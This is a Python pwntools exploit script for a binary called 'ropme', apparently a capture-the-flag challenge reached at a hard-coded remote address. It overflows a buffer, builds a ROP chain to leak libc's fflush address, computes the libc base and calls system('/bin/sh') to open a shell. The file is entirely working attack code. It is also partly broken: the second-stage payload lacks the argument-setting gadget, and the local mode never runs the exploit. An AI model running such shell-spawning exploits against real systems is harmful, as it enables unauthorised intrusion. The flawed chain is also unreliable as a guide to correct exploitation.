#!/usr/bin/env python3
from pwn import *
from binascii import hexlify
import sys


def exploit(p, fflush_offset, system_offset, bin_sh_offset):
    # Prepare gadgets and addresses
    offset = b'A' * 72
    pop_rdi = p64(0x4006d3)
    elf = ELF('./ropme')
    got_puts = p64(elf.got["puts"])
    plt_puts = p64(elf.symbols["puts"])
    got_fgets = p64(elf.got["fgets"])
    got_fflush = p64(elf.got["fflush"])
    plt_fflush = p64(elf.symbols["fflush"])
    main = p64(elf.symbols["main"])

    # First stage to leak address of fflush in libc
    payload = offset
    payload += pop_rdi
    payload += got_fflush
    payload += plt_puts
    #payload += pop_rdi
    #payload += p64(0x0)
    #payload += plt_fflush
    payload += main
    print(p.recvline())
    p.sendline(payload)
    
    # Get proper libc address format
    leak = p.recvline()[:-1]
    leak = get_leak(leak)
    #print(hexlify(p64(leak)[::-1]))

    # Calculate the base
    base = leak - fflush_offset
    print(f'[BASE] libc: 0x{hexlify(p64(base)[::-1]).decode()}')

    # Calculate the addresses of /bin/sh and system within libc
    system = p64(base + system_offset)
    bin_sh = p64(base + bin_sh_offset)
    
    # Stage 2 to execute shell
    payload = offset
    payload += bin_sh
    payload += system
    # Tried one gadbet solution too, doesn't work :(
    #gadget = p64(base + 0x67608)
    #print(hexlify(gadget[::-1]))
    #payload += gadget     
    print(p.recvline())
    p.sendline(payload)
    p.interactive()


def get_leak(leak):
    # Tried this method instead of hexlify
    return u64(leak.ljust(8, b'\x00'))


def main():
    if sys.argv[1] == 'local':
        p = process('./ropme')
        fflush_offset = 0x0749c0
        system_offset = 0x048e50
        bin_sh_offset = 0x18a152
    if sys.argv[1] == 'remote':
        p = remote('159.65.54.14', 30989)
        fflush_offset = 0x0657a0
        system_offset = 0x03f430
        bin_sh_offset = 0x160f58
        exploit(p, fflush_offset, system_offset, bin_sh_offset)



if __name__=='__main__':
    main()
